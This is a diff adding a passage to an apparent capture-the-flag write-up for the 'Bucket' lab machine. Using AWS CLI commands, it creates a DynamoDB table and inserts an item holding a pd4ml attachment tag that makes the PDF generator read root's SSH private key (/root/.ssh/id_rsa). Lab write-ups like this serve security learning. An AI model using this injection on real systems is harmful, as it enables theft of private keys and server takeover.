@@ -487,4 +487,63 @@ Finally it calls to `pd4ml` and creates a `PDF` with the table content.
 <br />
 
 
+To fully understand this `process`, we are going to go through it step by step.
 
+Since the `alerts` table does not exist yet, we need to create it manually using the `AWS CLI` and with the structure we saw earlier in the `index.php` file.
+
+With a little `research` on Google we found the necessary `documentation` and be able to do it with the following oneliner:
+
+<br />
+
+```bash
+❯ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 --table-class STANDARD --endpoint-url=http://s3.bucket.htb --output=json
+{
+    "TableDescription": {
+        "AttributeDefinitions": [
+            {
+                "AttributeName": "title",
+                "AttributeType": "S"
+            }
+        ],
+        "TableName": "alerts",
+        "KeySchema": [
+            {
+                "AttributeName": "title",
+                "KeyType": "HASH"
+            }
+        ],
+        "TableStatus": "ACTIVE",
+        "CreationDateTime": "2025-04-12T17:31:31.366000+02:00",
+        "ProvisionedThroughput": {
+            "LastIncreaseDateTime": "1970-01-01T01:00:00+01:00",
+            "LastDecreaseDateTime": "1970-01-01T01:00:00+01:00",
+            "NumberOfDecreasesToday": 0,
+            "ReadCapacityUnits": 5,
+            "WriteCapacityUnits": 5
+        },
+        "TableSizeBytes": 0,
+        "ItemCount": 0,
+        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
+    }
+}
+```
+
+<br />
+
+The second step, is to insert the required `content` into the table.
+
+After another little work of research, we found documentation to do it:
+
+<br />
+
+```bash
+❯  aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"Testing to hard\" src=\"file:/root/.ssh/id_rsa\"></pd4ml:attachment>"}}' --endpoint-url http://s3.bucket.htb --output=json
+{
+    "ConsumedCapacity": {
+        "TableName": "alerts",
+        "CapacityUnits": 1.0
+    }
+}
+```
+
+<br />
